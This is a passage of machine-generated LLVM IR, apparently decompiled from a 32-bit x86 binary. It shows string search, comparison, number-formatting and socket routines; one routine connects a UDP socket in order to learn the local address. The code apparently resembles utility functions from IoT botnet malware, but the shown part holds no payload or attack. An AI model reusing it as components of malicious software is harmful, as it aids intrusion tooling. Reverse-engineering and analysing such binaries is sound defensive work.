  store i32 %v1_8051ee8, i32* @ebx, align 4
  %v0_8051ee9 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8051eeb = icmp sgt i32 %v0_8051ee9, %v1_8051ee8
  br i1 %v7_8051eeb, label %dec_label_pc_8051eed, label %dec_label_pc_8051ef4

dec_label_pc_8051eed:                             ; preds = %dec_label_pc_8051ee8
  %v1_8051eed = load i32, i32* %esi.global-to-local, align 4
  %v3_8051eed = add i32 %v1_8051eed, %v0_8051ef4.pre
  %v4_8051eed = inttoptr i32 %v3_8051eed to i8*
  %v5_8051eed = load i8, i8* %v4_8051eed, align 1
  %v14_8051eed = icmp eq i8 %v5_8051eed, 10
  %v1_8051ef2 = icmp eq i1 %v14_8051eed, false
  br i1 %v1_8051ef2, label %dec_label_pc_8051eed.dec_label_pc_8051ed5_crit_edge, label %dec_label_pc_8051ef4

dec_label_pc_8051eed.dec_label_pc_8051ed5_crit_edge: ; preds = %dec_label_pc_8051eed
  %v0_8051edc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051ed5

dec_label_pc_8051ef4:                             ; preds = %dec_label_pc_8051ed5, %dec_label_pc_8051ee8, %dec_label_pc_8051eed
  %v0_8051ef4 = phi i32 [ %v1_8051ee8, %dec_label_pc_8051ee8 ], [ %v1_8051ee8, %dec_label_pc_8051eed ], [ %v0_8051ef4.pre, %dec_label_pc_8051ed5 ]
  %v1_8051ef4 = icmp eq i32 %v0_8051ef4, 0
  %v1_8051ef6 = icmp eq i1 %v1_8051ef4, false
  %v0_8051f03 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051f03 = select i1 %v1_8051ef6, i32 %v0_8051f03, i32 0
  store i32 %v0_8051ec3, i32* @ebx, align 4
  store i32 %v0_8051ec1, i32* @edi, align 4
  ret i32 %v2_8051f03

; uselistorder directives
  uselistorder i32 %v1_8051ee8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8051ef4.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8051ee5, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_80523dc, { 1, 0 }
  uselistorder label %dec_label_pc_8051ef4, { 2, 1, 0 }
}

define i32 @function_8051f10() local_unnamed_addr {
dec_label_pc_8051f10:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_8051f1d = call i32 @function_8052779(i32 16)
  %v1_8051f22 = inttoptr i32 %v1_8051f1d to i32*
  store i32 0, i32* %v1_8051f22, align 4
  %v3_8051f2f = call i32 @function_8052a35(i32 2, i32 2, i32 0)
  store i32 %v3_8051f2f, i32* %esi.global-to-local, align 4
  %v10_8051f3b = icmp eq i32 %v3_8051f2f, -1
  br i1 %v10_8051f3b, label %dec_label_pc_8051f82, label %dec_label_pc_8051f40

dec_label_pc_8051f40:                             ; preds = %dec_label_pc_8051f10
  %v2_8051f40 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051f40, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8051f5f = call i32 @function_805285a(i32 %v3_8051f2f, i32 %v2_8051f40, i32 16)
  %v2_8051f67 = ptrtoint i32* %stack_var_-12 to i32
  %v0_8051f6d = load i32, i32* %esi.global-to-local, align 4
  %v3_8051f6e = call i32 @function_8052885(i32 %v0_8051f6d, i32 %v2_8051f40, i32 %v2_8051f67)
  %v1_8051f76 = call i32 @function_8052241(i32 %v0_8051f6d)
  br label %dec_label_pc_8051f82

dec_label_pc_8051f82:                             ; preds = %dec_label_pc_8051f10, %dec_label_pc_8051f40
  %v0_8051f87 = phi i32 [ 0, %dec_label_pc_8051f10 ], [ 134744072, %dec_label_pc_8051f40 ]
  ret i32 %v0_8051f87

; uselistorder directives
  uselistorder i32 %v3_8051f2f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805285a, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8052a35, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8051f82, { 1, 0 }
}

define i32 @function_8051f90(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051f90:
  %tmp18 = inttoptr i32 %arg3 to i8*
  %v2_8051fa2 = load i8, i8* %tmp18, align 1
  %v3_8051fa2 = icmp eq i8 %v2_8051fa2, 0
  br i1 %v3_8051fa2, label %dec_label_pc_8051fb8, label %dec_label_pc_8051fa8

dec_label_pc_8051fa8:                             ; preds = %dec_label_pc_8051f90, %dec_label_pc_8051fa8
  %v2_8051fa8 = phi i32 [ %v1_8051fab, %dec_label_pc_8051fa8 ], [ 0, %dec_label_pc_8051f90 ]
  %v1_8051fab = add i32 %v2_8051fa8, 1
  %v2_8051fb2 = add i32 %v1_8051fab, %arg3
  %v3_8051fb2 = inttoptr i32 %v2_8051fb2 to i8*
  %v4_8051fb2 = load i8, i8* %v3_8051fb2, align 1
  %v5_8051fb2 = icmp eq i8 %v4_8051fb2, 0
  %v1_8051fb6 = icmp eq i1 %v5_8051fb2, false
  br i1 %v1_8051fb6, label %dec_label_pc_8051fa8, label %dec_label_pc_8051fb8

dec_label_pc_8051fb8:                             ; preds = %dec_label_pc_8051fa8, %dec_label_pc_8051f90
  %v2_8051fef = phi i32 [ 0, %dec_label_pc_8051f90 ], [ %v1_8051fab, %dec_label_pc_8051fa8 ]
  %v4_8051fbe = ptrtoint i8* %arg1 to i32
  %tmp25 = icmp slt i32 %arg2, 1
  br i1 %tmp25, label %dec_label_pc_8051fec, label %dec_label_pc_8051fc6.preheader

dec_label_pc_8051fc6.preheader:                   ; preds = %dec_label_pc_8051fb8
  %v4_8051fc6.pre = load i32, i32* @ecx, align 4
  %v6_8051fc8.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051fc6

dec_label_pc_8051fc6:                             ; preds = %dec_label_pc_8051fc6.preheader, %dec_label_pc_8051fe7
  %v0_8051fe7 = phi i32 [ %arg2, %dec_label_pc_8051fc6.preheader ], [ %v1_8051fe7, %dec_label_pc_8051fe7 ]
  %v6_8051fc8 = phi i32 [ %v6_8051fc8.pre, %dec_label_pc_8051fc6.preheader ], [ %v2_8051fe1, %dec_label_pc_8051fe7 ]
  %v0_8051ff5 = phi i32 [ 0, %dec_label_pc_8051fc6.preheader ], [ %v1_8051fc88, %dec_label_pc_8051fe7 ]
  %v4_8051fc6 = phi i32 [ %v4_8051fc6.pre, %dec_label_pc_8051fc6.preheader ], [ %v0_8051fe1, %dec_label_pc_8051fe7 ]
  %v0_8051fcc = phi i32 [ %v4_8051fbe, %dec_label_pc_8051fc6.preheader ], [ %v1_8051fcc, %dec_label_pc_8051fe7 ]
  %v1_8051fc6 = inttoptr i32 %v0_8051fcc to i8*
  %v2_8051fc6 = load i8, i8* %v1_8051fc6, align 1
  %v3_8051fc6 = zext i8 %v2_8051fc6 to i32
  %v5_8051fc6 = and i32 %v4_8051fc6, -256
  %v6_8051fc6 = or i32 %v3_8051fc6, %v5_8051fc6
  store i32 %v6_8051fc6, i32* @ecx, align 4
  %v2_8051fc8 = add i32 %v0_8051ff5, %arg3
  %v3_8051fc8 = inttoptr i32 %v2_8051fc8 to i8*
  %v4_8051fc8 = load i8, i8* %v3_8051fc8, align 1
  %v5_8051fc8 = zext i8 %v4_8051fc8 to i32
  %v7_8051fc8 = and i32 %v6_8051fc8, -256
  %v8_8051fc8 = or i32 %v5_8051fc8, %v7_8051fc8
  %v1_8051fcc = add i32 %v0_8051fcc, 1
  %v1_8051fcd = add i8 %v2_8051fc6, -65
  %v8_8051fd2 = icmp ugt i8 %v1_8051fcd, 25
  br i1 %v8_8051fd2, label %dec_label_pc_8051fd7, label %dec_label_pc_8051fd4

dec_label_pc_8051fd4:                             ; preds = %dec_label_pc_8051fc6
  %v1_8051fd4 = or i32 %v6_8051fc6, 96
  store i32 %v1_8051fd4, i32* @ecx, align 4
  br label %dec_label_pc_8051fd7

dec_label_pc_8051fd7:                             ; preds = %dec_label_pc_8051fc6, %dec_label_pc_8051fd4
  %v0_8051fe1 = phi i32 [ %v6_8051fc6, %dec_label_pc_8051fc6 ], [ %v1_8051fd4, %dec_label_pc_8051fd4 ]
  %v1_8051fd7 = add i8 %v4_8051fc8, -65
  %v8_8051fdc = icmp ugt i8 %v1_8051fd7, 25
  br i1 %v8_8051fdc, label %dec_label_pc_8051fe1, label %dec_label_pc_8051fde

dec_label_pc_8051fde:                             ; preds = %dec_label_pc_8051fd7
  %v1_8051fde = or i32 %v8_8051fc8, 96
  br label %dec_label_pc_8051fe1

dec_label_pc_8051fe1:                             ; preds = %dec_label_pc_8051fd7, %dec_label_pc_8051fde
  %v2_8051fe1 = phi i32 [ %v8_8051fc8, %dec_label_pc_8051fd7 ], [ %v1_8051fde, %dec_label_pc_8051fde ]
  %v1_8051fe1 = trunc i32 %v0_8051fe1 to i8
  %v3_8051fe1 = trunc i32 %v2_8051fe1 to i8
  %v15_8051fe1 = icmp eq i8 %v1_8051fe1, %v3_8051fe1
  br i1 %v15_8051fe1, label %dec_label_pc_8051ff5, label %dec_label_pc_8051fe5

dec_label_pc_8051fe5:                             ; preds = %dec_label_pc_8051fe1
  br label %dec_label_pc_8051fe7

dec_label_pc_8051fe7:                             ; preds = %dec_label_pc_8051ff5, %dec_label_pc_8051fe5
  %v1_8051fc88 = phi i32 [ %v1_8051ff5, %dec_label_pc_8051ff5 ], [ 0, %dec_label_pc_8051fe5 ]
  %v1_8051fe7 = add i32 %v0_8051fe7, -1
  %tmp26 = icmp slt i32 %v1_8051fe7, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_8051fc6, label %dec_label_pc_8051fec

dec_label_pc_8051fec:                             ; preds = %dec_label_pc_8051fe7, %dec_label_pc_8051fb8
  store i32 %v2_8051fef, i32* @edx, align 4
  ret i32 -1

dec_label_pc_8051ff5:                             ; preds = %dec_label_pc_8051fe1
  %v1_8051ff5 = add i32 %v0_8051ff5, 1
  %v14_8051ff6 = icmp eq i32 %v2_8051fef, %v1_8051ff5
  %v1_8051ff9 = icmp eq i1 %v14_8051ff6, false
  br i1 %v1_8051ff9, label %dec_label_pc_8051fe7, label %dec_label_pc_8051ffb

dec_label_pc_8051ffb:                             ; preds = %dec_label_pc_8051ff5
  store i32 %v4_8051fbe, i32* @ecx, align 4
  %v2_8052001 = sub i32 %v1_8051fcc, %v4_8051fbe
  store i32 %v2_8051fef, i32* @edx, align 4
  ret i32 %v2_8052001

; uselistorder directives
  uselistorder i32 %v1_8051fe7, { 1, 0 }
  uselistorder i32 %v0_8051ff5, { 1, 0 }
  uselistorder i32 %v4_8051fbe, { 2, 1, 0 }
  uselistorder i32 %v2_8051fef, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8051fe1, { 1, 0 }
  uselistorder label %dec_label_pc_8051fd7, { 1, 0 }
  uselistorder label %dec_label_pc_8051fc6, { 1, 0 }
  uselistorder label %dec_label_pc_8051fa8, { 1, 0 }
}

define i32 @function_8052010() local_unnamed_addr {
dec_label_pc_8052010:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %v4_8052012 = ptrtoint i8* %tmp13 to i32
  %v4_8052018 = ptrtoint i8* %tmp to i32
  %v2_805201c = load i8, i8* %tmp13, align 1
  %v3_805201c = icmp eq i8 %v2_805201c, 0
  br i1 %v3_805201c, label %dec_label_pc_8052028, label %dec_label_pc_8052021

dec_label_pc_8052021:                             ; preds = %dec_label_pc_8052010, %dec_label_pc_8052021
  %v0_8052021 = phi i32 [ %v1_8052021, %dec_label_pc_8052021 ], [ 0, %dec_label_pc_8052010 ]
  %v1_8052021 = add i32 %v0_8052021, 1
  %v2_8052022 = add i32 %v1_8052021, %v4_8052012
  %v3_8052022 = inttoptr i32 %v2_8052022 to i8*
  %v4_8052022 = load i8, i8* %v3_8052022, align 1
  %v5_8052022 = icmp eq i8 %v4_8052022, 0
  %v1_8052026 = icmp eq i1 %v5_8052022, false
  br i1 %v1_8052026, label %dec_label_pc_8052021, label %dec_label_pc_8052028

dec_label_pc_8052028:                             ; preds = %dec_label_pc_8052021, %dec_label_pc_8052010
  %v0_8052039 = phi i32 [ 0, %dec_label_pc_8052010 ], [ %v1_8052021, %dec_label_pc_8052021 ]
  %v2_805202a = load i8, i8* %tmp, align 1
  %v3_805202a = icmp eq i8 %v2_805202a, 0
  br i1 %v3_805202a, label %dec_label_pc_8052037, label %dec_label_pc_8052030

dec_label_pc_8052030:                             ; preds = %dec_label_pc_8052028, %dec_label_pc_8052030
  %v0_8052030 = phi i32 [ %v1_8052030, %dec_label_pc_8052030 ], [ 0, %dec_label_pc_8052028 ]
  %v1_8052030 = add i32 %v0_8052030, 1
  %v2_8052031 = add i32 %v1_8052030, %v4_8052018
  %v3_8052031 = inttoptr i32 %v2_8052031 to i8*
  %v4_8052031 = load i8, i8* %v3_8052031, align 1
  %v5_8052031 = icmp eq i8 %v4_8052031, 0
  %v1_8052035 = icmp eq i1 %v5_8052031, false
  br i1 %v1_8052035, label %dec_label_pc_8052030, label %dec_label_pc_8052037

dec_label_pc_8052037:                             ; preds = %dec_label_pc_8052030, %dec_label_pc_8052028
  %v0_8052037 = phi i32 [ 0, %dec_label_pc_8052028 ], [ %v1_8052030, %dec_label_pc_8052030 ]
  store i32 %v0_8052037, i32* @edx, align 4
  %v12_8052039 = icmp eq i32 %v0_8052039, %v0_8052037
  br i1 %v12_8052039, label %dec_label_pc_8052044.preheader, label %dec_label_pc_805203d

dec_label_pc_8052044.preheader:                   ; preds = %dec_label_pc_8052037
  %v1_805204417 = add i32 %v0_8052039, -1
  store i32 %v1_805204417, i32* @edx, align 4
  %v10_805204518 = icmp eq i32 %v0_8052039, 0
  br i1 %v10_805204518, label %dec_label_pc_8052052, label %dec_label_pc_805204a

dec_label_pc_805203d:                             ; preds = %dec_label_pc_805204a, %dec_label_pc_8052037
  ret i32 0

dec_label_pc_8052042:                             ; preds = %dec_label_pc_805204a
  %v3_805204a = zext i8 %v2_805204a to i32
  %v5_805204a = and i32 %v4_805204a20, -256
  %v6_805204a = or i32 %v3_805204a, %v5_805204a
  %v1_8052042 = add i32 %v0_805204221, 1
  %v1_8052043 = add i32 %v0_805204319, 1
  %v1_8052044 = add i32 %v1_805204422, -1
  store i32 %v1_8052044, i32* @edx, align 4
  %v10_8052045 = icmp eq i32 %v1_805204422, 0
  br i1 %v10_8052045, label %dec_label_pc_8052052, label %dec_label_pc_805204a

dec_label_pc_805204a:                             ; preds = %dec_label_pc_8052044.preheader, %dec_label_pc_8052042
  %v1_805204422 = phi i32 [ %v1_8052044, %dec_label_pc_8052042 ], [ %v1_805204417, %dec_label_pc_8052044.preheader ]
  %v0_805204221 = phi i32 [ %v1_8052042, %dec_label_pc_8052042 ], [ %v4_8052012, %dec_label_pc_8052044.preheader ]
  %v4_805204a20 = phi i32 [ %v6_805204a, %dec_label_pc_8052042 ], [ %v0_8052039, %dec_label_pc_8052044.preheader ]
  %v0_805204319 = phi i32 [ %v1_8052043, %dec_label_pc_8052042 ], [ %v4_8052018, %dec_label_pc_8052044.preheader ]
  %v1_805204a = inttoptr i32 %v0_805204221 to i8*
  %v2_805204a = load i8, i8* %v1_805204a, align 1
  %v3_805204c = inttoptr i32 %v0_805204319 to i8*
  %v4_805204c = load i8, i8* %v3_805204c, align 1
  %v15_805204c = icmp eq i8 %v2_805204a, %v4_805204c
  br i1 %v15_805204c, label %dec_label_pc_8052042, label %dec_label_pc_805203d

dec_label_pc_8052052:                             ; preds = %dec_label_pc_8052042, %dec_label_pc_8052044.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_805204422, { 1, 0 }
  uselistorder i32 %v0_8052039, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805204a, { 1, 0 }
  uselistorder label %dec_label_pc_8052030, { 1, 0 }
  uselistorder label %dec_label_pc_8052021, { 1, 0 }
}

define i32 @function_8052060() local_unnamed_addr {
dec_label_pc_8052060:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %tmp14 = call i8* @__decompiler_undefined_function_2()
  %v4_8052062 = ptrtoint i8* %tmp14 to i32
  %v4_8052068 = ptrtoint i8* %tmp13 to i32
  %v2_8052070 = load i8, i8* %tmp14, align 1
  %v3_8052070 = icmp eq i8 %v2_8052070, 0
  br i1 %v3_8052070, label %dec_label_pc_805207c, label %dec_label_pc_8052075

dec_label_pc_8052075:                             ; preds = %dec_label_pc_8052060, %dec_label_pc_8052075
  %v0_8052075 = phi i32 [ %v1_8052075, %dec_label_pc_8052075 ], [ 0, %dec_label_pc_8052060 ]
  %v1_8052075 = add i32 %v0_8052075, 1
  %v2_8052076 = add i32 %v1_8052075, %v4_8052062
  %v3_8052076 = inttoptr i32 %v2_8052076 to i8*
  %v4_8052076 = load i8, i8* %v3_8052076, align 1
  %v5_8052076 = icmp eq i8 %v4_8052076, 0
  %v1_805207a = icmp eq i1 %v5_8052076, false
  br i1 %v1_805207a, label %dec_label_pc_8052075, label %dec_label_pc_805207c

dec_label_pc_805207c:                             ; preds = %dec_label_pc_8052075, %dec_label_pc_8052060
  %v1_805208a = phi i32 [ 0, %dec_label_pc_8052060 ], [ %v1_8052075, %dec_label_pc_8052075 ]
  %v2_805207e = load i8, i8* %tmp13, align 1
  %v3_805207e = icmp eq i8 %v2_805207e, 0
  br i1 %v3_805207e, label %dec_label_pc_805208a, label %dec_label_pc_8052083

dec_label_pc_8052083:                             ; preds = %dec_label_pc_805207c, %dec_label_pc_8052083
  %v0_8052083 = phi i32 [ %v1_8052083, %dec_label_pc_8052083 ], [ 0, %dec_label_pc_805207c ]
  %v1_8052083 = add i32 %v0_8052083, 1
  %v2_8052084 = add i32 %v1_8052083, %v4_8052068
  %v3_8052084 = inttoptr i32 %v2_8052084 to i8*
  %v4_8052084 = load i8, i8* %v3_8052084, align 1
  %v5_8052084 = icmp eq i8 %v4_8052084, 0
  %v1_8052088 = icmp eq i1 %v5_8052084, false
  br i1 %v1_8052088, label %dec_label_pc_8052083, label %dec_label_pc_805208a

dec_label_pc_805208a:                             ; preds = %dec_label_pc_8052083, %dec_label_pc_805207c
  %v1_805208e = phi i32 [ 0, %dec_label_pc_805207c ], [ %v1_8052083, %dec_label_pc_8052083 ]
  %v8_805208c = icmp sgt i32 %tmp, %v1_805208a
  br i1 %v8_805208c, label %dec_label_pc_8052092, label %dec_label_pc_805208e

dec_label_pc_805208e:                             ; preds = %dec_label_pc_805208a
  %v7_8052090 = icmp sgt i32 %tmp, %v1_805208e
  br i1 %v7_8052090, label %dec_label_pc_8052092, label %dec_label_pc_8052099.preheader

dec_label_pc_8052099.preheader:                   ; preds = %dec_label_pc_805208e
  %v10_805209a19 = icmp eq i32 %tmp, 0
  br i1 %v10_805209a19, label %dec_label_pc_8052094, label %dec_label_pc_805209f

dec_label_pc_8052092:                             ; preds = %dec_label_pc_805209f, %dec_label_pc_805208e, %dec_label_pc_805208a
  br label %dec_label_pc_8052094

dec_label_pc_8052094:                             ; preds = %dec_label_pc_8052099.preheader, %dec_label_pc_8052097, %dec_label_pc_8052092
  %storemerge = phi i32 [ 0, %dec_label_pc_8052092 ], [ 1, %dec_label_pc_8052097 ], [ 1, %dec_label_pc_8052099.preheader ]
  ret i32 %storemerge

dec_label_pc_8052097:                             ; preds = %dec_label_pc_805209f
  %v3_805209f = zext i8 %v2_805209f to i32
  %v5_805209f = and i32 %v4_805209f21, -256
  %v6_805209f = or i32 %v3_805209f, %v5_805209f
  %v1_8052097 = add i32 %v0_805209722, 1
  %v1_8052098 = add i32 %v0_805209820, 1
  %v10_805209a = icmp eq i32 %v1_805209923, 0
  br i1 %v10_805209a, label %dec_label_pc_8052094, label %dec_label_pc_805209f

dec_label_pc_805209f:                             ; preds = %dec_label_pc_8052099.preheader, %dec_label_pc_8052097
  %v1_805209923.in = phi i32 [ %v1_805209923, %dec_label_pc_8052097 ], [ %tmp, %dec_label_pc_8052099.preheader ]
  %v0_805209722 = phi i32 [ %v1_8052097, %dec_label_pc_8052097 ], [ %v4_8052062, %dec_label_pc_8052099.preheader ]
  %v4_805209f21 = phi i32 [ %v6_805209f, %dec_label_pc_8052097 ], [ %v1_805208e, %dec_label_pc_8052099.preheader ]
  %v0_805209820 = phi i32 [ %v1_8052098, %dec_label_pc_8052097 ], [ %v4_8052068, %dec_label_pc_8052099.preheader ]
  %v1_805209923 = add i32 %v1_805209923.in, -1
  %v1_805209f = inttoptr i32 %v0_805209722 to i8*
  %v2_805209f = load i8, i8* %v1_805209f, align 1
  %v3_80520a1 = inttoptr i32 %v0_805209820 to i8*
  %v4_80520a1 = load i8, i8* %v3_80520a1, align 1
  %v15_80520a1 = icmp eq i8 %v2_805209f, %v4_80520a1
  br i1 %v15_80520a1, label %dec_label_pc_8052097, label %dec_label_pc_8052092

; uselistorder directives
  uselistorder label %dec_label_pc_805209f, { 1, 0 }
  uselistorder label %dec_label_pc_8052094, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052083, { 1, 0 }
  uselistorder label %dec_label_pc_8052075, { 1, 0 }
}

define i32 @function_80520b0(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80520b0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v12_80520b4 = ptrtoint i32* %stack_var_-64 to i32
  %v4_80520bb = trunc i64 %arg1 to i32
  store i32 %v4_80520bb, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_80520c3 = icmp eq i32 %arg3, 0
  br i1 %v2_80520c3, label %dec_label_pc_8052130, label %dec_label_pc_80520c7

dec_label_pc_80520c7:                             ; preds = %dec_label_pc_80520b0
  %v2_80520c7 = icmp eq i32 %v4_80520bb, 0
  %v3_80520c7 = icmp slt i32 %v4_80520bb, 0
  br i1 %v2_80520c7, label %dec_label_pc_8052140, label %dec_label_pc_80520cb

dec_label_pc_80520cb:                             ; preds = %dec_label_pc_80520c7
  %v9_80520d0 = icmp eq i32 %arg2, 10
  br i1 %v9_80520d0, label %dec_label_pc_805215d, label %dec_label_pc_80520d9

dec_label_pc_80520d9:                             ; preds = %dec_label_pc_805215d, %dec_label_pc_80520cb
  br label %dec_label_pc_80520dd

dec_label_pc_80520dd:                             ; preds = %dec_label_pc_8052165, %dec_label_pc_80520d9
  %storemerge34 = phi i32 [ %v4_80520bb, %dec_label_pc_80520d9 ], [ %v1_8052167, %dec_label_pc_8052165 ]
  %v0_80520e44 = phi i32 [ %v4_80520bb, %dec_label_pc_80520d9 ], [ %v1_8052167, %dec_label_pc_8052165 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_80520d9 ], [ 1, %dec_label_pc_8052165 ]
  store i32 %storemerge34, i32* %ecx.global-to-local, align 4
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  store i32 32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520e2

dec_label_pc_80520e2:                             ; preds = %dec_label_pc_80520e2.dec_label_pc_80520e2_crit_edge, %dec_label_pc_80520dd
  %v2_80520f3 = phi i32 [ %v2_80520f3.pre, %dec_label_pc_80520e2.dec_label_pc_80520e2_crit_edge ], [ %v12_80520b4, %dec_label_pc_80520dd ]
  %v3_80520f3 = phi i32 [ %v1_80520fb, %dec_label_pc_80520e2.dec_label_pc_80520e2_crit_edge ], [ 32, %dec_label_pc_80520dd ]
  %v0_80520e6 = phi i32 [ %v0_80520fc, %dec_label_pc_80520e2.dec_label_pc_80520e2_crit_edge ], [ %arg2, %dec_label_pc_80520dd ]
  %v0_80520e4 = phi i32 [ %div19, %dec_label_pc_80520e2.dec_label_pc_80520e2_crit_edge ], [ %v0_80520e44, %dec_label_pc_80520dd ]
  %tmp31 = urem i32 %v0_80520e4, %v0_80520e6
  %v7_80520ee = icmp sgt i32 %tmp31, 9
  %v1_80520f0.v1_80520eb.v = select i1 %v7_80520ee, i32 55, i32 48
  %v1_80520f0.v1_80520eb = add i32 %v1_80520f0.v1_80520eb.v, %tmp31
  %v1_80520f3 = trunc i32 %v1_80520f0.v1_80520eb to i8
  %v4_80520f3 = add i32 %v3_80520f3, 14
  %v5_80520f3 = add i32 %v4_80520f3, %v2_80520f3
  %v6_80520f3 = inttoptr i32 %v5_80520f3 to i8*
  store i8 %v1_80520f3, i8* %v6_80520f3, align 1
  %v0_80520f9 = load i32, i32* %ecx.global-to-local, align 4
  %v0_80520fb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520fb = add i32 %v0_80520fb, -1
  store i32 %v1_80520fb, i32* %ebx.global-to-local, align 4
  %v0_80520fc = load i32, i32* %esi.global-to-local, align 4
  %div19 = udiv i32 %v0_80520f9, %v0_80520fc
  store i32 %div19, i32* %eax.global-to-local, align 4
  %tmp32 = urem i32 %v0_80520f9, %v0_80520fc
  store i32 %tmp32, i32* %edx.global-to-local, align 4
  store i32 %div19, i32* %ecx.global-to-local, align 4
  %v1_8052100 = icmp ugt i32 %v0_80520fc, %v0_80520f9
  %v1_8052102 = icmp eq i1 %v1_8052100, false
  br i1 %v1_8052102, label %dec_label_pc_80520e2.dec_label_pc_80520e2_crit_edge, label %dec_label_pc_8052104

dec_label_pc_80520e2.dec_label_pc_80520e2_crit_edge: ; preds = %dec_label_pc_80520e2
  %v2_80520f3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80520e2

dec_label_pc_8052104:                             ; preds = %dec_label_pc_80520e2
  %v0_8052104 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052104 = icmp eq i32 %v0_8052104, 0
  %v1_8052106 = icmp eq i1 %v1_8052104, false
  br i1 %v1_8052106, label %dec_label_pc_8052156, label %dec_label_pc_8052108

dec_label_pc_8052108:                             ; preds = %dec_label_pc_8052104
  store i32 %v0_80520fb, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052109

dec_label_pc_8052109:                             ; preds = %dec_label_pc_8052156, %dec_label_pc_8052108
  %v1_8052109 = phi i32 [ %v1_8052109.pre, %dec_label_pc_8052156 ], [ %v0_80520fb, %dec_label_pc_8052108 ]
  %v0_8052109 = load i32, i32* @esp, align 4
  %v2_8052109 = add i32 %v1_8052109, 14
  %v3_8052109 = add i32 %v2_8052109, %v0_8052109
  store i32 %v3_8052109, i32* %eax.global-to-local, align 4
  %v1_805210d = inttoptr i32 %v3_8052109 to i8*
  %v2_805210d = load i8, i8* %v1_805210d, align 1
  %v3_805210d = icmp eq i8 %v2_805210d, 0
  br i1 %v3_805210d, label %dec_label_pc_8052175, label %dec_label_pc_8052112

dec_label_pc_8052112:                             ; preds = %dec_label_pc_8052109
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052114

dec_label_pc_8052114:                             ; preds = %dec_label_pc_8052114, %dec_label_pc_8052112
  %v0_8052114 = phi i32 [ %v1_8052114, %dec_label_pc_8052114 ], [ 0, %dec_label_pc_8052112 ]
  %v1_8052114 = add i32 %v0_8052114, 1
  store i32 %v1_8052114, i32* %ecx.global-to-local, align 4
  %v2_8052115 = add i32 %v1_8052114, %v3_8052109
  %v3_8052115 = inttoptr i32 %v2_8052115 to i8*
  %v4_8052115 = load i8, i8* %v3_8052115, align 1
  %v5_8052115 = icmp eq i8 %v4_8052115, 0
  %v1_8052119 = icmp eq i1 %v5_8052115, false
  br i1 %v1_8052119, label %dec_label_pc_8052114, label %dec_label_pc_805211b

dec_label_pc_805211b:                             ; preds = %dec_label_pc_8052114
  %v10_805211b = icmp eq i32 %v0_8052114, -2
  br i1 %v10_805211b, label %dec_label_pc_8052130, label %dec_label_pc_8052120

dec_label_pc_8052120:                             ; preds = %dec_label_pc_805211b
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_8052109, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052124

dec_label_pc_8052124:                             ; preds = %dec_label_pc_8052175, %dec_label_pc_8052120, %dec_label_pc_8052124.dec_label_pc_8052124_crit_edge
  %v2_8052127 = phi i32 [ %v1_805212a, %dec_label_pc_8052124.dec_label_pc_8052124_crit_edge ], [ %arg3, %dec_label_pc_8052120 ], [ %arg3, %dec_label_pc_8052175 ]
  %v0_8052126 = phi i32 [ %v0_805212b, %dec_label_pc_8052124.dec_label_pc_8052124_crit_edge ], [ %v1_8052114, %dec_label_pc_8052120 ], [ 0, %dec_label_pc_8052175 ]
  %v4_8052124 = phi i32 [ %v4_8052124.pre, %dec_label_pc_8052124.dec_label_pc_8052124_crit_edge ], [ %v3_8052109, %dec_label_pc_8052120 ], [ %v3_8052109, %dec_label_pc_8052175 ]
  %v0_8052124 = phi i32 [ %v1_8052129, %dec_label_pc_8052124.dec_label_pc_8052124_crit_edge ], [ %v3_8052109, %dec_label_pc_8052120 ], [ %v3_8052109, %dec_label_pc_8052175 ]
  %v1_8052124 = inttoptr i32 %v0_8052124 to i8*
  %v2_8052124 = load i8, i8* %v1_8052124, align 1
  %v3_8052124 = zext i8 %v2_8052124 to i32
  %v5_8052124 = and i32 %v4_8052124, -256
  %v6_8052124 = or i32 %v3_8052124, %v5_8052124
  store i32 %v6_8052124, i32* %eax.global-to-local, align 4
